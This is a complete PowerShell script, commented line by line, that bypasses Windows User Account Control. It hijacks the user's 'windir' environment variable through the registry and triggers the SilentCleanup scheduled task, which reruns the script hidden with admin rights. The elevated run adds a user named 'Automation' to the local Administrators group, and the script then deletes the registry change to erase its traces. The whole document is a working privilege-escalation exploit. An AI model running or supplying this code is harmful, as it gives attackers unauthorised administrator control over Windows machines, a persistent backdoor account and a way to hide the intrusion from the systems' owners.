if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) { # Everything in this code block will run with admin privileges
    $Username = "Automation" # Name of the username we want to give admin priviliges.
    Add-LocalGroupMember "Administrators" -Member $Username # Add the user to the local admins group
} else { # if we dont have admin privilges, we run this code.
    $registryPath = "HKCU:\Environment" # This is the registry path we modify to mess with environment variables for the current user.
    $Name = "windir" # Windir is an enviroment variable that points to the windows install directory (typically C:\Windows\).
    $Value = "powershell -ep bypass -w h $PSCommandPath;#" # The hash mark makes the scheduled tasks command look like a code-comment, therefore ignored so we can run powershell commands.
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value # we modify the registry entry for the environment variable, with our PowerShell exploit.
    Start-Sleep -Seconds 5 # Sleeping for slower systems.
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null # Scheduled tasks runs with admin privs even when a regular, non-admin users is logged in.
    Start-Sleep -Seconds 5 # Sleeping for slower systems.
    Remove-ItemProperty -Path $registryPath -Name $name # Now we remove the registry entry we just modified, making everything back to the state it was without the exploit being there anymore.
}
